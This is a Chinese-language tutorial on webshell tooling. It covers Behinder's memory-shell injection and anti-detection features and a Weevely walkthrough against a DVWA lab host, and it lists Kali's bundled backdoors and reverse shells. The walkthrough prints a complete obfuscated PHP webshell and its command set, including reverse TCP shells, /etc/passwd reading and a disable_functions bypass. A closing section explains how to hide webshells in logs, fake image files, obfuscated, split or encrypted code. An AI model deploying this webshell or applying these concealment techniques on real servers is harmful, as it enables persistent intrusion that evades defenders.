+<h4 id="数据库管理-1"><a href="#数据库管理-1" class="headerlink" title="数据库管理"></a>数据库管理</h4><p>数据库管理属于常规功能,目前支持<code>SQL Server</code>、<code>MySQL</code>、<code>Oracle</code>,当服务器环境为<code>Java</code>或者<code>C#</code>时,如果缺少对应的数据库管理库,冰蝎会自动上传并加载对应的库文件.</p>
+<p>另外,如果数据库连接密码中有特殊字符(如<code>@</code>符号),用URL编码一下即可(<code>@</code>编码之后为<code>40%</code>)</p>
+<p>选择数据库类型后,在连接字符串处修改账户密码,然后点击”连接”按钮,连接成功后即可执行语句</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202402161208610.png" data-fancybox="true"/></div></div>
+
+<p>随后直接点击左侧图标即可图形化操作</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202402161208991.png" data-fancybox="true"/></div></div>
+
+<h4 id="自定义代码"><a href="#自定义代码" class="headerlink" title="自定义代码"></a>自定义代码</h4><p>冰蝎提供asp、c#、php、Java的自定义代码执行功能,文本框支持语法高亮,c#和Java会把输入的源代码自动编译并执行.</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202402161208755.png" data-fancybox="true"/></div></div>
+
+<h4 id="备忘录"><a href="#备忘录" class="headerlink" title="备忘录"></a>备忘录</h4><p>备忘录模块提供对当前Shell的一些临时文本信息进行存储.直接输入内容即可,冰蝎会自动保存.</p>
+<h4 id="注入内存马"><a href="#注入内存马" class="headerlink" title="注入内存马"></a>注入内存马</h4><p>冰蝎采用基于Agent技术的Java内存马注入功能,目前支持<code>Tomcat</code>、<code>Weblogic</code>、<code>Jboss</code>.其中<code>Tomcat</code>和<code>Jboss</code>对内存马注入路径没有任何限制.</p>
+<p>Weblogic的内存马注入路径需要在真实存在的应用名称的路径下,比如<code>http://xxx.com:7001/console/memShell</code>,<code>Console</code>即为应用名称不能直接注入到<code>http://xxx.com:7001/memShell</code></p>
+<p>另外,冰蝎还提供了内存马防检测功能,该功能会阻止其他<code>Agent</code>注入进当前<code>JVM</code>进程.当然注入内存马的时候如果开启该功能,冰蝎后续也无法再次注入内存马</p>
+<h4 id="代理"><a href="#代理" class="headerlink" title="代理"></a>代理</h4><p>冰蝎提供<code>Sosks5</code>和<code>HTTP</code>代理,反弹Shell时利用的就是内置代理功能</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202402161209381.png" data-fancybox="true"/></div></div>
+
+<h3 id="Weevely"><a href="#Weevely" class="headerlink" title="Weevely"></a>Weevely</h3><blockquote>
+<p>Weevely是一款开源的<code>WebShell</code>工具,用Python编写,可以在Linux系统上使用.它提供了一种方便的方式来生成和连接<code>WebShell</code>,并以客户端&#x2F;服务器(C&#x2F;S)模式构建.Weevely具有很强的隐蔽性,可以用作替代PHP菜刀的工具.</p>
+<p>Weevely具有多种功能,包括服务器错误配置审计、后门放置、暴力破解、文件管理、资源搜索、网络代理、命令执行、数据库操作、系统信息收集和端口扫描等.这些功能使它成为一个强大的渗透测试工具,可以用于评估和检测Web应用程序的安全性.</p>
+</blockquote>
+<h4 id="简单使用"><a href="#简单使用" class="headerlink" title="简单使用"></a>简单使用</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kill3r)-[/home/kill3r]</span><br><span class="line">└─<span class="comment"># weevely </span></span><br><span class="line"></span><br><span class="line">[+] weevely 4.0.1</span><br><span class="line">[!] Error: the following arguments are required: url, password</span><br><span class="line"></span><br><span class="line">[+] Run terminal or <span class="built_in">command</span> on the target</span><br><span class="line">    weevely &lt;URL&gt; &lt;password&gt; [cmd]</span><br><span class="line"></span><br><span class="line">[+] Recover an existing session</span><br><span class="line">    weevely session &lt;path&gt; [cmd]</span><br><span class="line"></span><br><span class="line">[+] Generate new agent</span><br><span class="line">    weevely generate &lt;password&gt; &lt;path&gt;</span><br><span class="line">    </span><br><span class="line">┌──(root㉿kill3r)-[/home/kill3r]</span><br><span class="line">└─<span class="comment"># weevely -h</span></span><br><span class="line">usage: weevely [-h] &#123;terminal,session,generate&#125; ...</span><br><span class="line"></span><br><span class="line">positional arguments:</span><br><span class="line">  &#123;terminal,session,generate&#125;</span><br><span class="line">    terminal            Run terminal or <span class="built_in">command</span> on the target</span><br><span class="line">    session             Recover an existing session</span><br><span class="line">    generate            Generate new agent</span><br><span class="line"></span><br><span class="line">options:</span><br><span class="line">  -h, --<span class="built_in">help</span>            show this <span class="built_in">help</span> message and <span class="built_in">exit</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kill3r)-[/home/kill3r]</span><br><span class="line">└─<span class="comment"># weevely generate kill3r eval.php</span></span><br><span class="line">Generated <span class="string">&#x27;eval.php&#x27;</span> with password <span class="string">&#x27;kill3r&#x27;</span> of 771 byte size.</span><br><span class="line">                                                                                                                 </span><br><span class="line">┌──(root㉿kill3r)-[/home/kill3r]</span><br><span class="line">└─<span class="comment"># cat eval.php        </span></span><br><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$p</span>=<span class="string">&#x27;$kk&quot;k&quot;=&quot;8713ak&quot;bbek&quot;&quot;k&quot;;$kh=&quot;4c1df24e1k&quot;6a8&quot;;$kfk&quot;=&quot;9f449eb431ffk&quot;&quot;;$p=&quot;9k&quot;k&quot;dvzq8pk&#x27;</span>;</span><br><span class="line"><span class="variable">$Q</span>=<span class="string">&#x27;o=&quot;&quot;;for($i=k&quot;0;$i&lt;$lk&quot;;)k&quot;&#123;for($j=0;($j&lt;$c&amp;k&quot;&amp;$i&lt;k&quot;$l);k&quot;$j++,$i+k&quot;+)&#123;$o.=$k&quot;t&#123;$i&#125;k&quot;^&#x27;</span>;</span><br><span class="line"><span class="variable">$m</span>=<span class="string">&#x27;k&quot;(@x(@basek&quot;64_decodk&quot;e(k&quot;$m[1]),$k))k&quot;);$o=@ob_gk&quot;et_contk&quot;entk&quot;s();@k&quot;ob_end_k&quot;clea&#x27;</span>;</span><br><span class="line"><span class="variable">$L</span>=<span class="string">&#x27;UtsMk&quot;tw2M&quot;k&quot;;functik&quot;on k&quot;x($t,$k)k&quot;&#123;$c=k&quot;strlen($k&quot;k);$l=k&quot;k&quot;strlen($t);k&quot;k&quot;$k&quot;&#x27;</span>;</span><br><span class="line"><span class="variable">$G</span>=<span class="string">&#x27;n();k&quot;$r=@bk&quot;ase6k&quot;4_encodek&quot;(@x(@gzk&quot;compresk&quot;s($o),$kk&quot;))k&quot;;printk&quot;(&quot;$p$khk&quot;$r$kf&quot;);&#125;&#x27;</span>;</span><br><span class="line"><span class="variable">$l</span>=<span class="string">&#x27;$k&#123;k&quot;$jk&quot;&#125;;&#125;&#125;k&quot;k&quot;return $o;&#125;k&quot;if k&quot;(@preg_match(&quot;/$khk&quot;(.+k&quot;k&quot;)$kf/&quot;k&quot;,@file_getk&quot;k&quot;_cont&#x27;</span>;</span><br><span class="line"><span class="variable">$U</span>=str_replace(<span class="string">&#x27;kJ&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;crekJakJkJkJte_funckJkJtion&#x27;</span>);</span><br><span class="line"><span class="variable">$x</span>=<span class="string">&#x27;ents(&quot;php:k&quot;//ink&quot;put&quot;)k&quot;k&quot;,$m)==1) &#123;@ob_stark&quot;k&quot;t()k&quot;k&quot;;@evk&quot;al(@gzuncomk&quot;press&#x27;</span>;</span><br><span class="line"><span class="variable">$Y</span>=str_replace(<span class="string">&#x27;k&quot;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$p</span>.<span class="variable">$L</span>.<span class="variable">$Q</span>.<span class="variable">$l</span>.<span class="variable">$x</span>.<span class="variable">$m</span>.<span class="variable">$G</span>);</span><br><span class="line"><span class="variable">$t</span>=<span class="variable">$U</span>(<span class="string">&#x27;&#x27;</span>,<span class="variable">$Y</span>);<span class="variable">$t</span>();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kill3r)-[/home/kill3r]</span><br><span class="line">└─<span class="comment"># weevely http://192.168.64.245/dvwa/hackable/uploads/eval.php kill3r                 </span></span><br><span class="line"></span><br><span class="line">[+] weevely 4.0.1</span><br><span class="line"></span><br><span class="line">[+] Target:     192.168.64.245</span><br><span class="line">[+] Session:    /root/.weevely/sessions/192.168.64.245/eval_0.session</span><br><span class="line"></span><br><span class="line">[+] Browse the filesystem or execute commands starts the connection</span><br><span class="line">[+] to the target. Type :<span class="built_in">help</span> <span class="keyword">for</span> more information.</span><br><span class="line"></span><br><span class="line">weevely&gt; :<span class="built_in">help</span></span><br><span class="line"></span><br><span class="line"> :system_procs                 List running processes.                                           </span><br><span class="line"> :system_extensions            Collect PHP and webserver extension list.                        </span><br><span class="line"> :system_info                  Collect system information.                                       </span><br><span class="line"> :backdoor_tcp                 Spawn a Shell on a TCP port.                                     </span><br><span class="line"> :backdoor_reversetcp          Execute a reverse TCP Shell.                                     </span><br><span class="line"> :net_scan                     TCP Port scan.                                                   </span><br><span class="line"> :net_curl                     Perform a curl-like HTTP request.                                 </span><br><span class="line"> :net_proxy                    Run <span class="built_in">local</span> proxy to pivot HTTP/HTTPS browsing through the target. </span><br><span class="line"> :net_phpproxy                 Install PHP proxy on the target.                                 </span><br><span class="line"> :net_ifconfig                 Get network interfaces addresses.                                 </span><br><span class="line"> :net_mail                     Send mail.                                                       </span><br><span class="line"> :file_tar                     Compress or <span class="built_in">expand</span> tar archives.                                 </span><br><span class="line"> :file_bzip2                   Compress or <span class="built_in">expand</span> bzip2 files.                                   </span><br><span class="line"> :file_download                Download file from remote filesystem.                             </span><br><span class="line"> :file_upload2web              Upload file automatically to a web folder and get corresponding URL. </span><br><span class="line"> :file_touch                   Change file timestamp.                                           </span><br><span class="line"> :file_upload                  Upload file to remote filesystem.                                 </span><br><span class="line"> :file_find                    Find files with given names and attributes.                       </span><br><span class="line"> :file_ls                      List directory content.                                           </span><br><span class="line"> :file_read                    Read remote file from the remote filesystem.                     </span><br><span class="line"> :file_cp                      Copy single file.                                                 </span><br><span class="line"> :file_mount                   Mount remote filesystem using HTTPfs.                             </span><br><span class="line"> :file_check                   Get attributes and permissions of a file.                         </span><br><span class="line"> :file_gzip                    Compress or <span class="built_in">expand</span> gzip files.                                   </span><br><span class="line"> :file_grep                    Print lines matching a pattern <span class="keyword">in</span> multiple files.                 </span><br><span class="line"> :file_zip                     Compress or <span class="built_in">expand</span> zip files.                                     </span><br><span class="line"> :file_rm                      Remove remote file.                                               </span><br><span class="line"> :file_webdownload             Download an URL.                                                 </span><br><span class="line"> :file_clearlog                Remove string from a file.                                       </span><br><span class="line"> :file_edit                    Edit remote file on a <span class="built_in">local</span> editor.                               </span><br><span class="line"> :file_cd                      Change current working directory.                                 </span><br><span class="line"> :file_enum                    Check existence and permissions of a list of paths.               </span><br><span class="line"> :Shell_php                    Execute PHP commands.                                             </span><br><span class="line"> :Shell_sh                     Execute Shell commands.                                           </span><br><span class="line"> :Shell_su                     Execute commands with su.                                         </span><br><span class="line"> :audit_suidsgid               Find files with SUID or SGID flags.                               </span><br><span class="line"> :audit_phpconf                Audit PHP configuration.                                         </span><br><span class="line"> :audit_disablefunctionbypass  Bypass disable_function restrictions with mod_cgi and .htaccess. </span><br><span class="line"> :audit_etcpasswd              Read /etc/passwd with different techniques.                       </span><br><span class="line"> :audit_filesystem             Audit the file system <span class="keyword">for</span> weak permissions.                       </span><br><span class="line"> :sql_dump                     Multi dbms mysqldump replacement.                                 </span><br><span class="line"> :sql_console                  Execute SQL query or run console.                                 </span><br><span class="line"> :bruteforce_sql               Bruteforce SQL database.                                         </span><br><span class="line"></span><br><span class="line">The system Shell interpreter is not available <span class="keyword">in</span> this session, use the</span><br><span class="line">following <span class="built_in">command</span> replacements to simulate a unrestricted Shell.</span><br><span class="line"></span><br><span class="line"> ps                                         system_procs     </span><br><span class="line"> <span class="built_in">whoami</span>, hostname, <span class="built_in">pwd</span>, <span class="built_in">uname</span>               system_info      </span><br><span class="line"> nmap                                       net_scan         </span><br><span class="line"> curl                                       net_curl         </span><br><span class="line"> ifconfig                                   net_ifconfig     </span><br><span class="line"> mail                                       net_mail         </span><br><span class="line"> tar                                        file_tar         </span><br><span class="line"> bzip2, bunzip2                             file_bzip2       </span><br><span class="line"> <span class="built_in">touch</span>                                      file_touch       </span><br><span class="line"> find                                       file_find        </span><br><span class="line"> <span class="built_in">ls</span>, <span class="built_in">dir</span>                                    file_ls          </span><br><span class="line"> <span class="built_in">cat</span>                                        file_read        </span><br><span class="line"> <span class="built_in">cp</span>, copy                                   file_cp          </span><br><span class="line"> gzip, gunzip                               file_gzip        </span><br><span class="line"> grep                                       file_grep        </span><br><span class="line"> zip, unzip                                 file_zip         </span><br><span class="line"> <span class="built_in">rm</span>                                         file_rm          </span><br><span class="line"> wget                                       file_webdownload </span><br><span class="line"> vi, vim, emacs, nano, pico, gedit, kwrite  file_edit        </span><br><span class="line"> <span class="built_in">cd</span>                                         file_cd          </span><br><span class="line"> ifconfig                                   Shell_su         </span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">:system_procs                 列出正在运行的进程.</span><br><span class="line">:system_extensions            收集PHP和Web服务器扩展列表.</span><br><span class="line">:system_info                  收集系统信息.</span><br><span class="line">:backdoor_tcp                 在TCP端口上生成一个Shell.</span><br><span class="line">:backdoor_reversetcp          执行反向TCP Shell.</span><br><span class="line">:net_scan                     TCP端口扫描.</span><br><span class="line">:net_curl                     执行类似于curl的HTTP请求.</span><br><span class="line">:net_proxy                    运行本地代理,将HTTP/HTTPS浏览器请求通过目标主机进行中继.</span><br><span class="line">:net_phpproxy                 在目标主机上安装PHP代理.</span><br><span class="line">:net_ifconfig                 获取网络接口地址.</span><br><span class="line">:net_mail                     发送邮件.</span><br><span class="line">:file_tar                     压缩或解压tar归档文件.</span><br><span class="line">:file_bzip2                   压缩或解压bzip2文件.</span><br><span class="line">:file_download                从远程文件系统下载文件.</span><br><span class="line">:file_upload2web              自动将文件上传到Web目录并获取相应的URL.</span><br><span class="line">:file_touch                   更改文件时间戳.</span><br><span class="line">:file_upload                  将文件上传到远程文件系统.</span><br><span class="line">:file_find                    查找具有给定名称和属性的文件.</span><br><span class="line">:file_ls                      列出目录内容.</span><br><span class="line">:file_read                    从远程文件系统读取远程文件.</span><br><span class="line">:file_cp                      复制单个文件.</span><br><span class="line">:file_mount                   使用HTTPfs挂载远程文件系统.</span><br><span class="line">:file_check                   获取文件的属性和权限.</span><br><span class="line">:file_gzip                    压缩或解压gzip文件.</span><br><span class="line">:file_grep                    在多个文件中打印与模式匹配的行.</span><br><span class="line">:file_zip                     压缩或解压zip文件.</span><br><span class="line">:file_rm                      删除远程文件.</span><br><span class="line">:file_webdownload             下载URL.</span><br><span class="line">:file_clearlog                从文件中删除字符串.</span><br><span class="line">:file_edit                    在本地编辑器上编辑远程文件.</span><br><span class="line">:file_cd                      更改当前工作目录.</span><br><span class="line">:file_enum                    检查路径列表中的存在和权限.</span><br><span class="line">:Shell_php                    执行PHP命令.</span><br><span class="line">:Shell_sh                     执行Shell命令.</span><br><span class="line">:Shell_su                     以su方式执行命令.</span><br><span class="line">:audit_suidsgid               查找具有SUID或SGID标志的文件.</span><br><span class="line">:audit_phpconf                审计PHP配置.</span><br><span class="line">:audit_disablefunctionbypass  使用mod_cgi和.htaccess绕过disable_function限制.</span><br><span class="line">:audit_etcpasswd              使用不同的技术读取/etc/passwd.</span><br><span class="line">:audit_filesystem             对弱权限进行文件系统审计.</span><br><span class="line">:sql_dump                     多个dbms mysqldump替代.</span><br><span class="line">:sql_console                  执行SQL查询或运行控制台.</span><br><span class="line">:bruteforce_sql               暴力破解SQL数据库.</span><br><span class="line"></span><br><span class="line">在此会话中,系统Shell解释器不可用,请使用以下命令替代来模拟无限制的Shell使用.</span><br><span class="line"></span><br><span class="line">ps                                         system_procs</span><br><span class="line"><span class="built_in">whoami</span>, hostname, <span class="built_in">pwd</span>, <span class="built_in">uname</span>               system_info</span><br><span class="line">nmap                                       net_scan</span><br><span class="line">curl                                       net_curl</span><br><span class="line">ifconfig                                   net_ifconfig</span><br><span class="line">mail                                       net_mail</span><br><span class="line">tar                                        file_tar</span><br><span class="line">bzip2, bunzip2                             file_bzip2</span><br><span class="line"><span class="built_in">touch</span>                                      file_touch</span><br><span class="line">find                                       file_find</span><br><span class="line"><span class="built_in">ls</span>, <span class="built_in">dir</span>                                    file_ls</span><br><span class="line"><span class="built_in">cat</span>                                        file_read</span><br><span class="line"><span class="built_in">cp</span>, copy                                   file_cp</span><br><span class="line">gzip, gunzip                               file_gzip</span><br><span class="line">grep                                       file_grep</span><br><span class="line">zip, unzip                                 file_zip</span><br><span class="line"><span class="built_in">rm</span>                                         file_rm</span><br><span class="line">wget                                       file_webdownload</span><br><span class="line">vi, vim, emacs, nano, pico, gedit, kwrite  file_edit</span><br><span class="line"><span class="built_in">cd</span>                                         file_cd</span><br><span class="line">ifconfig                                   shell_su</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">weevely&gt; :system_info</span><br><span class="line">+--------------------+------------------------------------------------------------------------------+</span><br><span class="line">| document_root      | D:/phpstudy_pro/WWW                                                          |</span><br><span class="line">| <span class="built_in">whoami</span>             |                                                                              |</span><br><span class="line">| hostname           | DESKTOP-B6O1S2Q                                                              |</span><br><span class="line">| <span class="built_in">pwd</span>                | D:\phpstudy_pro\WWW\dvwa\hackable\uploads                                    |</span><br><span class="line">| open_basedir       |                                                                              |</span><br><span class="line">| safe_mode          | False                                                                        |</span><br><span class="line">| script             | /dvwa/hackable/uploads/eval.php                                              |</span><br><span class="line">| script_folder      | D:\phpstudy_pro\WWW\dvwa\hackable\uploads                                    |</span><br><span class="line">| <span class="built_in">uname</span>              | Windows NT DESKTOP-B6O1S2Q 6.2 build 9200 (Windows 8 Business Edition) AMD64 |</span><br><span class="line">| os                 | Windows NT                                                                   |</span><br><span class="line">| client_ip          | 192.168.64.215                                                               |</span><br><span class="line">| max_execution_time | 300                                                                          |</span><br><span class="line">| php_self           | /dvwa/hackable/uploads/eval.php                                              |</span><br><span class="line">| dir_sep            | \                                                                            |</span><br><span class="line">| php_version        | 5.5.9                                                                        |</span><br><span class="line">+--------------------+------------------------------------------------------------------------------+</span><br><span class="line">DESKTOP-B6O1S2Q:D:\phpstudy_pro\WWW\dvwa\hackable\uploads $ file_ls</span><br><span class="line">.</span><br><span class="line">..</span><br><span class="line">dvwa_email.png</span><br><span class="line">eval.php</span><br></pre></td></tr></table></figure>
+
+<h3 id="WebShells"><a href="#WebShells" class="headerlink" title="WebShells"></a>WebShells</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kill3r)-[/usr/share/webshells]</span><br><span class="line">└─<span class="comment"># webshells                                     </span></span><br><span class="line"></span><br><span class="line">&gt; webshells ~ Collection of webshells</span><br><span class="line"></span><br><span class="line">/usr/share/WebShells</span><br><span class="line">├── asp</span><br><span class="line">├── aspx</span><br><span class="line">├── cfm</span><br><span class="line">├── jsp</span><br><span class="line">├── laudanum -&gt; /usr/share/laudanum</span><br><span class="line">├── perl</span><br><span class="line">└── php</span><br><span class="line"></span><br><span class="line">┌──(root㉿kill3r)-[/usr/share/webshells]</span><br><span class="line">└─<span class="comment"># tree /usr/share/webshells</span></span><br><span class="line">/usr/share/webshells</span><br><span class="line">├── asp</span><br><span class="line">│   ├── cmd-asp-5.1.asp</span><br><span class="line">│   └── cmdasp.asp</span><br><span class="line">├── aspx</span><br><span class="line">│   └── cmdasp.aspx</span><br><span class="line">├── cfm</span><br><span class="line">│   └── cfexec.cfm</span><br><span class="line">├── jsp</span><br><span class="line">│   ├── cmdjsp.jsp</span><br><span class="line">│   └── jsp-reverse.jsp</span><br><span class="line">├── laudanum -&gt; /usr/share/laudanum</span><br><span class="line">├── perl</span><br><span class="line">│   ├── perlcmd.cgi</span><br><span class="line">│   └── perl-reverse-shell.pl</span><br><span class="line">└── php</span><br><span class="line">    ├── findsocket</span><br><span class="line">    │   ├── findsock.c</span><br><span class="line">    │   └── php-findsock-shell.php</span><br><span class="line">    ├── php-backdoor.php</span><br><span class="line">    ├── php-reverse-shell.php</span><br><span class="line">    ├── qsd-php-backdoor.php</span><br><span class="line">    └── simple-backdoor.php</span><br><span class="line"></span><br><span class="line">9 directories, 14 files</span><br></pre></td></tr></table></figure>
+
+<h2 id="WebShell隐藏"><a href="#WebShell隐藏" class="headerlink" title="WebShell隐藏"></a>WebShell隐藏</h2><ol>
+<li><p>隐藏到日志:</p>
+<ul>
+<li>修改发送数据包的头部,添加<code>WebShell</code>.Web服务器通常会保存访问记录到Web日志中.如果攻击者能够找到并将Web日志放置在可执行目录下,可能会获得对服务器的控制权.</li>
+</ul>
+</li>
+<li><p>隐藏到合法文件:</p>
+<ul>
+<li>在文件上传漏洞中,将含有PHP代码的文件伪装成.jpg文件.可以使用@运算符来避免出现任何错误,以增加伪装的成功率.</li>
+</ul>
+</li>
+<li><p>混淆:</p>
+<ul>
+<li><p>删除空格、换行符等字符,使代码文件看起来比较混乱,从而隐藏恶意函数名等关键信息.</p>
+</li>
+<li><p>使用编码或加密技术对恶意代码进行处理,使其更难以被人识别和分析.</p>
+</li>
+</ul>
+</li>
+<li><p>站马分离:</p>
+<ul>
+<li><p>文件分割:将恶意代码分割成多个文件,使其在文件系统中分散存储.这样做可以避免一次性检测和删除所有相关文件,增加了防御的复杂性.</p>
+</li>
+<li><p>数据注入:将恶意代码注入到合法文件或数据中,比如图片、文档或数据库中.这样做可以使恶意代码混杂在正常的数据中,降低被检测的概率.</p>
+</li>
+<li><p>加密&#x2F;压缩:使用加密算法或压缩技术对恶意代码进行处理,使其变得无法读取或分析.攻击者可以使用自定义的解密或解压缩过程来还原恶意代码,使其在被执行前难以被检测.</p>
+</li>
